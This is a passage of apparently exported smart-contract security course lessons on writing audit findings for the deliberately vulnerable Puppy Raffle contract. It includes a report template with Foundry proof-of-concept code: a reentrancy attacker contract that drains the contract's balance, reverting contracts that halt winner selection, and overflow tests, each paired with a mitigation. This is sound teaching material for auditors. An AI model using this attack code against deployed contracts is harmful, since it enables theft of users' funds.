          "folderName": "59-reporting-integer-overflow",
          "description": "",
          "duration": 8,
          "videoUrl": "Qu2fgua01IMbwQiLGcy7OOnOj73bmdCw6SYlVG2NLkCE",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/59-reporting-integer-overflow/+page.md",
          "markdownContent": "---\ntitle: Reporting - Integer Overflow\n---\n\n_Follow along with this video:_\n\n---\n\n### Integer Overflow and Unsafe Casting\n\nLets start with the integer overflow we identified in the `selectWinner` function. We thoroughly went through this vulnerability in previous lessons!\n\n```js\ntotalFees = totalFees + uint64(fee);\n```\n\nWe should begin by determining severity.\n\n- **Impact:** High - Fees are at risk of being lost/stuck. This typically is going to result in a high impact.\n- **Likelihood:** High - It could be argued that this is a `medium`, but the risk increases with how successful the protocol becomes, and we want Puppy Raffle to be successful. High.\n\nWith the above determined, let's start filling out our finding template. I know this seems repetitive, but this is what's going to make you _really good_ at writing these reports.\n\n```\n### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees\n```\n\nFor the description section, lets include some of the work we did in `chisel` to show this happening.\n\n````\n### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees\n\n**Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows.\n\n    ```js\n    uint64 myVar = type(uint64).max\n    // 18446744073709551615\n    myVar = myVar + 1\n    // myVar will be 0\n    ```\n\n**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract\n````\n\nNow, we didn't write a Proof of Concept together for this, but I _have_ prepared one. This is another moment I'm going to challenge you to write one yourself before continuing. You need to practice these skills to improve them.\n\nOnce you've made an attempt, compare what you've done with the PoC I've provided below to see how you did!\n\n<details>\n<summary>Integer Overflow PoC</summary>\n\n1. We conclude a raffle of 4 players\n2. We then have 89 players enter a new raffle, and conclude the raffle\n3. 3. `totalFees` will be:\n\n```js\ntotalFees = totalFees + uint64(fee);\n// substituted\ntotalFees = 800000000000000000 + 17800000000000000000;\n// due to overflow, the following is now the case\ntotalFees = 153255926290448384;\n```\n\n4. You will not be able to withdraw due to the line in `PuppyRaffle::withdrawFees`:\n\n```js\nrequire(address(this).balance ==\n  uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n```\n\nAlthough you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.\n\n<details>\n<summary>Code</summary>\n\n```js\nfunction testTotalFeesOverflow() public playersEntered {\n    // We finish a raffle of 4 to collect some fees\n    vm.warp(block.timestamp + duration + 1);\n    vm.roll(block.number + 1);\n    puppyRaffle.selectWinner();\n    uint256 startingTotalFees = puppyRaffle.totalFees();\n    // startingTotalFees = 800000000000000000\n\n    // We then have 89 players enter a new raffle\n    uint256 playersNum = 89;\n    address[] memory players = new address[](playersNum);\n    for (uint256 i = 0; i < playersNum; i++) {\n        players[i] = address(i);\n    }\n    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);\n    // We end the raffle\n    vm.warp(block.timestamp + duration + 1);\n    vm.roll(block.number + 1);\n\n    // And here is where the issue occurs\n    // We will now have fewer fees even though we just finished a second raffle\n    puppyRaffle.selectWinner();\n\n    uint256 endingTotalFees = puppyRaffle.totalFees();\n    console.log(\"ending total fees\", endingTotalFees);\n    assert(endingTotalFees < startingTotalFees);\n\n    // We are also unable to withdraw any fees because of the require check\n    vm.prank(puppyRaffle.feeAddress());\n    vm.expectRevert(\"PuppyRaffle: There are currently players active!\");\n    puppyRaffle.withdrawFees();\n}\n```\n\n</details>\n\n</details>\n\n---\n\nI trust you attempted the PoC yourself - time to add our recommended mitigation\n\n````\n**Recommended Mitigation:** There are a few recommended mitigations here.\n\n1. Use a newer version of Solidity that does not allow integer overflows by default.\n    ```diff\n    - pragma solidity ^0.7.6;\n    + pragma solidity ^0.8.18;\n    ```\nAlternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.\n\n1. Use a `uint256` instead of a `uint64` for `totalFees`.\n    ```diff\n    - uint64 public totalFees = 0;\n    + uint256 public totalFees = 0;\n    ```\n2. Remove the balance check in `PuppyRaffle::withdrawFees`\n    ```diff\n    - require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n    ```\nWe additionally want to bring your attention to another attack vector as a result of this line in a future finding.\n````\n\nThere's another finding we identified which is going to have a write up that is very similar to this one - unsafe casting. I'm going to challenge you to write this one yourself (as its a little repetitive and uninteresting after what we just did), but it's good practice. Compare your write up versus mine below.\n\n<details>\n<summary>Unsafe Casting Write Up</summary>\n    \n    ### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees\n\n    **Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.\n\n    ```javascript\n        function selectWinner() external {\n            require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n            require(players.length > 0, \"PuppyRaffle: No players in raffle\");\n\n            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n            address winner = players[winnerIndex];\n            uint256 fee = totalFees / 10;\n            uint256 winnings = address(this).balance - fee;\n    @>      totalFees = totalFees + uint64(fee);\n            players = new address[](0);\n            emit RaffleWinner(winner, winnings);\n        }\n    ```\n\n    The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.\n\n    **Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.\n\n    **Proof of Concept:**\n\n    1. A raffle proceeds with a little more than 18 ETH worth of fees collected\n    2. The line that casts the `fee` as a `uint64` hits\n    3. `totalFees` is incorrectly updated with a lower amount\n\n    You can replicate this in foundry's chisel by running the following:\n\n    ```javascript\n    uint256 max = type(uint64).max\n    uint256 fee = max + 1\n    uint64(fee)\n    // prints 0\n    ```\n\n    **Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:\n\n    ```javascript\n    // We do some storage packing to save gas\n    ```\n    But the potential gas saved isn't worth it if we have to recast and this bug exists.\n\n    ```diff\n    -   uint64 public totalFees = 0;\n    +   uint256 public totalFees = 0;\n    .\n    .\n    .\n        function selectWinner() external {\n            require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n            require(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n            uint256 winnerIndex =\n                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n            address winner = players[winnerIndex];\n            uint256 totalAmountCollected = players.length * entranceFee;\n            uint256 prizePool = (totalAmountCollected * 80) / 100;\n            uint256 fee = (totalAmountCollected * 20) / 100;\n    -       totalFees = totalFees + uint64(fee);\n    +       totalFees = totalFees + fee;\n    ```\n",
          "updates": []
        },
        {
          "lessonId": "de5044e6-06ff-4e3c-b117-292bf5babb9b",
          "number": 60,
          "title": "Reporting: Smart Contract Wallet Reverts Winning",
          "slug": "reporting-smart-contract-wallet-reverts-winning",
          "folderName": "60-reporting-smart-contract-wallet-reverts-winning",
          "description": "",
          "duration": 5,
          "videoUrl": "5n01fhvcNxXLLAJx01g5tV82UoZjhxjG4Vrz7uv01dbFb00",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/60-reporting-smart-contract-wallet-reverts-winning/+page.md",
          "markdownContent": "---\ntitle: Reporting - Smart Contract Wallet Reverts Winning\n---\n\n_Follow along with this video:_\n\n---\n\n### Smart Contract Wallet Reverts Winning\n\nNext vulnerability on our docket is going to be:\n\n```js\n//@Audit: winner wouldn't get their money if their fallback was messed up!\n```\n\nThis is absolutely an issue, our write up for it may be a _little_ lazy, but I think it's an important concept to be aware of.\n\nTo assess the severity, we again consider:\n\n- **Impact:** Medium - potentially wastes gas, disrupts the functionality of the protocol when selectWinner continually reverts\n- **Likelihood:** Low - the impact is only severe when there are a lot of users, so I think we can safely say low.\n\nSorted, lets fill out our finding template.\n\n```\n### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest\n\n**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.\n\nNon-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.\n\n**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.\n\nAlso, true winners would not be able to get paid out, and someone else would win their money!\n\n**Proof of Concept:**\n1. 10 smart contract wallets enter the lottery without a fallback or receive function.\n2. The lottery ends\n3. The `selectWinner` function wouldn't work, even though the lottery is over!\n\n**Recommended Mitigation:** There are a few options to mitigate this issue.\n\n1. Do not allow smart contract wallet entrants (not recommended)\n2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)\n```\n\nTo briefly touch on our recommendations here - The reason disallowing smart contract entrants would not be a preferred mitigation, is that this would restrict situations like multisignature wallets from participating. We'd much rather not lock people out entirely.\n\nFor this reason the second recommendation is preferred. This established a really good design pattern known as `Pull over Push`, where ideally, the user is making a request for funds, instead of a protocol distributing them.\n\nWe've only got a few findings left! Let's keep going!\n",
          "updates": []
        },
        {
          "lessonId": "24ea49ec-c15f-46d4-8f90-6830938e381d",
          "number": 61,
          "title": "Reporting: Mishandling Of ETH",
          "slug": "reporting-mishandling-of-eth",
          "folderName": "61-reporting-mishandling-of-eth",
          "description": "",
          "duration": 2,
          "videoUrl": "hkAJeXIrnASRt8ZuKsfvcrmcGLunb1QxxlgOgBMo500s",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/61-reporting-mishandling-of-eth/+page.md",
          "markdownContent": "---\ntitle: Reporting - Mishandling of Eth\n---\n\n_Follow along with this video:_\n\n---\n\n### Mishandling of Eth and MEV\n\nFrankly, we're going to skip the write ups for these.\n\nMEV issues, as I've mentioned, we'll go over later in the course, so we'll skip this for now.\n\nAs for Mishandling of Eth, we briefly touched on this earlier. The issue really boils down to this line:\n\n```js\nrequire(address(this).balance ==\n  uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n```\n\nThis requirement to withdraw leads to a number of potential pitfalls, including an inability to withdraw if the contract accounting becomes broken as well as opening the protocol up to griefing should a raffle always be open. Generally something we should inform the protocol of.\n",
          "updates": []
        },
        {
          "lessonId": "9fd225bc-0235-4198-9c75-dfa5996e307d",
          "number": 62,
          "title": "Reporting: Missing Events And Remove Dead Code",
          "slug": "reporting-missing-events-and-remove-dead-code",
          "folderName": "62-reporting-missing-events-and-remove-dead-code",
          "description": "",
          "duration": 2,
          "videoUrl": "Uq1cq402i1k3hsPgOVjGtVQAXZQcbw02ZLtb016vuBRf00U",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/62-reporting-missing-events-and-remove-dead-code/+page.md",
          "markdownContent": "---\ntitle: Reporting - Missing Events And Remove Dead Code\n---\n\n_Follow along with this video:_\n\n---\n\n## Missing Events and Dead Code\n\nThere are definitely events missing in Puppy Raffle, but we'll keep this write up quick.\n\nThis will be an informational finding, as we discussed earlier. A write up for this is going to look something like so:\n\n```\n### [I-6] State Changes are Missing Events\n\nA lack of emitted events can often lead to difficulty of external or front-end systems to accurately track changes within a protocol.\n\nIt is best practice to emit an event whenever an action results in a state change.\n\nExamples:\n- `PuppyRaffle::totalFees` within the `selectWinner` function\n- `PuppyRaffle::raffleStartTime` within the `selectWinner` function\n- `PuppyRaffle::totalFees` within the `withdrawFees` function\n```\n\nAdditionally, a quick write is likely all that's required for the next finding we identified, which was that `_getActivePlayerIndex` was `dead code` and never actually used. This could be `Gas` or `Informational`.\n\n````\n### [I-7] _isActivePlayer is never used and should be removed\n\n**Description:** The function PuppyRaffle::_isActivePlayer is never used and should be removed.\n\n    ```diff\n    -    function _isActivePlayer() internal view returns (bool) {\n    -        for (uint256 i = 0; i < players.length; i++) {\n    -            if (players[i] == msg.sender) {\n    -                return true;\n    -            }\n    -        }\n    -        return false;\n    -    }\n    ```\n````\n",
          "updates": []
        },
        {
          "lessonId": "8c41603b-156e-45b6-b603-b16525403bdf",
          "number": 63,
          "title": "Adding The Audit To Our Portfolio",
          "slug": "adding-the-audit-to-our-portfolio",
          "folderName": "63-adding-the-audit-to-our-portfolio",
          "description": "",
          "duration": 6,
          "videoUrl": "D1M02NFuke02zmyAu8eAUiHWronJFzAvGsxumG4Mt2z6M",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/63-adding-the-audit-to-our-portfolio/+page.md",
          "markdownContent": "---\ntitle: Adding The Audit To Our Portfolio\n---\n\n_Follow along with this video:_\n\n---\n\n### Adding to our Portfolio\n\nOk, we've - for the most part - completed the write ups for the findings we identified in Puppy Raffle. The next step is generatin our PDF report and adding this to our security portfolio!\n\nFirst step, let's add what we need to our `audit-data` folder.\n\nBoilerplating things is something you should get used to. This involves reusing assets and templating processes so that it's quick to get started. Here, we can grab our logo from our previous `PasswordStore` repo, and our formatted report template can be copied from [**`audit-report-templating`**](https://github.com/Cyfrin/audit-report-templating) repo into a new file we name `report-formatted.md` within our `audit-data` folder.\n\n<img src=\"/security-section-4/63-pdf-report/pdf-report1.png\" width=\"75%\" height=\"auto\">\n\nWith this template in place, we can just begin filling it out. Start by adding your name and details to customize the report.\n\n> **Note:** Keep an eye out for `//comments` in the report template below. This is where I'll have explained what's been added to each section.\n\nView the report in the dropdown below, please know it's quiet long.\n\n<details>\n<summary>PDF Report Template</summary>\n\n    ---\n    title: Puppy Raffle Audit Report\n    author: <YourName>\n    date: January 12, 2024\n    header-includes:\n    - \\usepackage{titling}\n    - \\usepackage{graphicx}\n    ---\n\n    \\begin{titlepage}\n        \\centering\n        \\begin{figure}[h]\n            \\centering\n            \\includegraphics[width=0.5\\textwidth]{logo.pdf}\n        \\end{figure}\n        \\vspace*{2cm}\n        {\\Huge\\bfseries Protocol Audit Report\\par}\n        \\vspace{1cm}\n        {\\Large Version 1.0\\par}\n        \\vspace{2cm}\n        {\\Large\\itshape Cyfrin.io\\par}\n        \\vfill\n        {\\large \\today\\par}\n    \\end{titlepage}\n\n    \\maketitle\n\n    <!-- Your report starts here! -->\n\n    Prepared by: <You!>\n    Lead Auditors:\n    - <YourName>\n\n    # Table of Contents\n    - [Table of Contents](#table-of-contents)\n    - [Protocol Summary](#protocol-summary)\n    - [Disclaimer](#disclaimer)\n    - [Risk Classification](#risk-classification)\n    - [Audit Details](#audit-details)\n    - [Scope](#scope)\n    - [Roles](#roles)\n    - [Executive Summary](#executive-summary)\n    - [Issues found](#issues-found)\n    - [Findings](#findings)\n    - [High](#high)\n    - [Medium](#medium)\n    - [Low](#low)\n    - [Informational](#informational)\n    - [Gas](#gas)\n\n    # Protocol Summary\n\n    // You might want to write your own personal summary here for practice! We're going to steal some details from the protocol README\n\n    This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:\n\n    - Call the enterRaffle function with the following parameters:\n        - address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.\n    - Duplicate addresses are not allowed\n    - Users are allowed to get a refund of their ticket & value if they call the refund function\n    - Every X seconds, the raffle will be able to draw a winner and be minted a random puppy\n    - The owner of the protocol will set a feeAddress to take a cut of the value, and the rest of the funds will be sent to the winner of the puppy.\n\n\n    # Disclaimer\n\n    The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.\n\n    # Risk Classification\n\n    |            |        | Impact |        |     |\n    | ---------- | ------ | ------ | ------ | --- |\n    |            |        | High   | Medium | Low |\n    |            | High   | H      | H/M    | M   |\n    | Likelihood | Medium | H/M    | M      | M/L |\n    |            | Low    | M      | M/L    | L   |\n\n    We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.\n\n    # Audit Details\n    // Here we'll grab the commit hash\n    Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5\n\n    ## Scope\n    // Scope can be grabbed from the README as well, remember to replace the â””â”€â”€ symbol!\n\n    ./src/\n    #-- PuppyRaffle.sol\n\n    ## Roles\n    // These details should be provided by the protocol, grab them from the README.\n\n    - Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.\n    - Player - Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through refund function.\n\n    # Executive Summary\n    // You can add any notes you'd like to this section to summarize your experience during the security review.\n\n    I loved auditing this code base. Patrick is a wizard at writing intentionally bad code!\n\n    ## Issues found\n\n    | Severity | Number of issues found |\n    | -------- | ---------------------- |\n    | High     | 3                      |\n    | Medium   | 3                      |\n    | Low      | 1                      |\n    | Info     | 7                      |\n    | Gas      | 2                      |\n    | Total    | 16                     |\n\n    # Findings\n    // Here we should be able to double check the formatting on our findings.md file and paste all of our findings here.\n\n    ## High\n\n    ### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance\n\n    **Description:** The `PuppyRaffle::refund` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables participants to drain the contract balance.\n\n    In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `players` array.\n\n    ```javascript\n    function refund(uint256 playerIndex) public {\n        address playerAddress = players[playerIndex];\n        require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n        require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n\n    @>  payable(msg.sender).sendValue(entranceFee);\n\n    @>  players[playerIndex] = address(0);\n        emit RaffleRefunded(playerAddress);\n    }\n    ```\n\n    A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained.\n\n    **Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.\n\n    **Proof of Concept:**\n\n    1. Users enters the raffle.\n    2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.\n    3. Attacker enters the raffle\n    4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.\n\n    **Proof of Code:**\n\n    <details>\n    <summary>Code</summary>\n    Add the following code to the `PuppyRaffleTest.t.sol` file.\n\n    ```javascript\n    contract ReentrancyAttacker {\n        PuppyRaffle puppyRaffle;\n        uint256 entranceFee;\n        uint256 attackerIndex;\n\n        constructor(address _puppyRaffle) {\n            puppyRaffle = PuppyRaffle(_puppyRaffle);\n            entranceFee = puppyRaffle.entranceFee();\n        }\n\n        function attack() external payable {\n            address[] memory players = new address[](1);\n            players[0] = address(this);\n            puppyRaffle.enterRaffle{value: entranceFee}(players);\n            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));\n            puppyRaffle.refund(attackerIndex);\n        }\n\n        fallback() external payable {\n            if (address(puppyRaffle).balance >= entranceFee) {\n                puppyRaffle.refund(attackerIndex);\n            }\n        }\n    }\n\n    function testReentrance() public playersEntered {\n        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));\n        vm.deal(address(attacker), 1e18);\n        uint256 startingAttackerBalance = address(attacker).balance;\n        uint256 startingContractBalance = address(puppyRaffle).balance;\n\n        attacker.attack();\n\n        uint256 endingAttackerBalance = address(attacker).balance;\n        uint256 endingContractBalance = address(puppyRaffle).balance;\n        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);\n        assertEq(endingContractBalance, 0);\n    }\n    ```\n    </details>\n\n    **Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.\n\n    ```diff\n        function refund(uint256 playerIndex) public {\n            address playerAddress = players[playerIndex];\n            require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n            require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n    +       players[playerIndex] = address(0);\n    +       emit RaffleRefunded(playerAddress);\n            (bool success,) = msg.sender.call{value: entranceFee}(\"\");\n            require(success, \"PuppyRaffle: Failed to refund player\");\n    -        players[playerIndex] = address(0);\n    -        emit RaffleRefunded(playerAddress);\n        }\n    ```\n\n    ### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner\n\n    **Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.\n\n    **Impact:** Any user can choose the winner of the raffle, winning the money and selecting the \"rarest\" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.\n\n    **Proof of Concept:**\n\n    There are a few attack vectors here.\n\n    1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.\n    2. Users can manipulate the `msg.sender` value to result in their index being the winner.\n\n    Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.\n\n    **Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).\n\n    ### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees\n\n    **Description:** In Solidity versions prior to `0.8.0`, integers were subject to integer overflows.\n\n    ```javascript\n    uint64 myVar = type(uint64).max;\n    // myVar will be 18446744073709551615\n    myVar = myVar + 1;\n    // myVar will be 0\n    ```\n\n    **Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.\n\n    **Proof of Concept:**\n    3. We first conclude a raffle of 4 players to collect some fees.\n    4. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.\n    5. `totalFees` will be:\n    ```javascript\n    totalFees = totalFees + uint64(fee);\n    // substituted\n    totalFees = 800000000000000000 + 17800000000000000000;\n    // due to overflow, the following is now the case\n    totalFees = 153255926290448384;\n    ```\n    6. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:\n    ```javascript\n    require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n    ```\n\n    Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.\n\n    <details>\n    <summary>Proof Of Code</summary>\n    Place this into the `PuppyRaffleTest.t.sol` file.\n\n    ```javascript\n    function testTotalFeesOverflow() public playersEntered {\n            // We finish a raffle of 4 to collect some fees\n            vm.warp(block.timestamp + duration + 1);\n            vm.roll(block.number + 1);\n            puppyRaffle.selectWinner();\n            uint256 startingTotalFees = puppyRaffle.totalFees();\n            // startingTotalFees = 800000000000000000\n\n            // We then have 89 players enter a new raffle\n            uint256 playersNum = 89;\n            address[] memory players = new address[](playersNum);\n            for (uint256 i = 0; i < playersNum; i++) {\n                players[i] = address(i);\n            }\n            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);\n            // We end the raffle\n            vm.warp(block.timestamp + duration + 1);\n            vm.roll(block.number + 1);\n\n            // And here is where the issue occurs\n            // We will now have fewer fees even though we just finished a second raffle\n            puppyRaffle.selectWinner();\n\n            uint256 endingTotalFees = puppyRaffle.totalFees();\n            console.log(\"ending total fees\", endingTotalFees);\n            assert(endingTotalFees < startingTotalFees);\n\n            // We are also unable to withdraw any fees because of the require check\n            vm.prank(puppyRaffle.feeAddress());\n            vm.expectRevert(\"PuppyRaffle: There are currently players active!\");\n            puppyRaffle.withdrawFees();\n        }\n    ```\n    </details>\n\n    **Recommended Mitigation:** There are a few recommended mitigations here.\n\n    7. Use a newer version of Solidity that does not allow integer overflows by default.\n\n    ```diff\n    - pragma solidity ^0.7.6;\n    + pragma solidity ^0.8.18;\n    ```\n\n    Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.\n\n    1. Use a `uint256` instead of a `uint64` for `totalFees`.\n\n    ```diff\n    - uint64 public totalFees = 0;\n    + uint256 public totalFees = 0;\n    ```\n\n    1. Remove the balance check in `PuppyRaffle::withdrawFees`\n\n    ```diff\n    - require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n    ```\n\n    We additionally want to bring your attention to another attack vector as a result of this line in a future finding.\n\n    ### [H-4] Malicious winner can forever halt the raffle\n    <!-- TODO: This is not accurate, but there are some issues. This is likely a low. Users who don't have a fallback can't get their money and the TX will fail. -->\n\n    **Description:** Once the winner is chosen, the `selectWinner` function sends the prize to the the corresponding address with an external call to the winner account.\n\n    ```javascript\n    (bool success,) = winner.call{value: prizePool}(\"\");\n    require(success, \"PuppyRaffle: Failed to send prize pool to winner\");\n    ```\n\n    If the `winner` account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `selectWinner` function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.\n\n    There's another attack vector that can be used to halt the raffle, leveraging the fact that the `selectWinner` function mints an NFT to the winner using the `_safeMint` function. This function, inherited from the `ERC721` contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.\n\n    Therefore, an attacker can register a smart contract in the raffle that does not implement the `onERC721Received` hook expected. This will prevent minting the NFT and will revert the call to `selectWinner`.\n\n    **Impact:** In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.\n\n    **Proof of Concept:**\n\n    <details>\n    <summary>Proof Of Code</summary>\n    Place the following test into `PuppyRaffleTest.t.sol`.\n\n    ```javascript\n    function testSelectWinnerDoS() public {\n        vm.warp(block.timestamp + duration + 1);\n        vm.roll(block.number + 1);\n\n        address[] memory players = new address[](4);\n        players[0] = address(new AttackerContract());\n        players[1] = address(new AttackerContract());\n        players[2] = address(new AttackerContract());\n        players[3] = address(new AttackerContract());\n        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);\n\n        vm.expectRevert();\n        puppyRaffle.selectWinner();\n    }\n    ```\n\n    For example, the `AttackerContract` can be this:\n\n    ```javascript\n    contract AttackerContract {\n        // Implements a `receive` function that always reverts\n        receive() external payable {\n            revert();\n        }\n    }\n    ```\n\n    Or this:\n\n    ```javascript\n    contract AttackerContract {\n        // Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.\n        receive() external payable {}\n    }\n    ```\n    </details>\n\n    **Recommended Mitigation:** Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.\n\n    ## Medium\n\n    ### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS vector, incrementing gas costs for future entrants\n\n    **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.\n\n    **Note to students: This next line would likely be it's own finding itself. However, we haven't taught you about MEV yet, so we are going to ignore it.**\n    Additionally, this increased gas cost creates front-running opportunities where malicious users can front-run another raffle entrant's transaction, increasing its costs, so their enter transaction fails.\n\n    **Impact:** The impact is two-fold.\n\n    1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.\n    2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.\n\n    **Proof of Concept:**\n\n    If we have 2 sets of 100 players enter, the gas costs will be as such:\n    - 1st 100 players: 6252039\n    - 2nd 100 players: 18067741\n\n    This is more than 3x as expensive for the second set of 100 players!\n\n    This is due to the for loop in the `PuppyRaffle::enterRaffle` function.\n\n    ```javascript\n            // Check for duplicates\n    @>      for (uint256 i = 0; i < players.length - 1; i++) {\n                for (uint256 j = i + 1; j < players.length; j++) {\n                    require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n                }\n            }\n    ```\n\n    <details>\n    <summary>Proof Of Code</summary>\n    Place the following test into `PuppyRaffleTest.t.sol`.\n\n    ```javascript\n    function testReadDuplicateGasCosts() public {\n            vm.txGasPrice(1);\n\n            // We will enter 5 players into the raffle\n            uint256 playersNum = 100;\n            address[] memory players = new address[](playersNum);\n            for (uint256 i = 0; i < playersNum; i++) {\n                players[i] = address(i);\n            }\n            // And see how much gas it cost to enter\n            uint256 gasStart = gasleft();\n            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);\n            uint256 gasEnd = gasleft();\n            uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;\n            console.log(\"Gas cost of the 1st 100 players:\", gasUsedFirst);\n\n            // We will enter 5 more players into the raffle\n            for (uint256 i = 0; i < playersNum; i++) {\n                players[i] = address(i + playersNum);\n            }\n            // And see how much more expensive it is\n            gasStart = gasleft();\n            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);\n            gasEnd = gasleft();\n            uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;\n            console.log(\"Gas cost of the 2nd 100 players:\", gasUsedSecond);\n\n            assert(gasUsedFirst < gasUsedSecond);\n            // Logs:\n            //     Gas cost of the 1st 100 players: 6252039\n            //     Gas cost of the 2nd 100 players: 18067741\n    }\n    ```\n    </details>\n\n    **Recommended Mitigation:** There are a few recommended mitigations.\n\n    1. 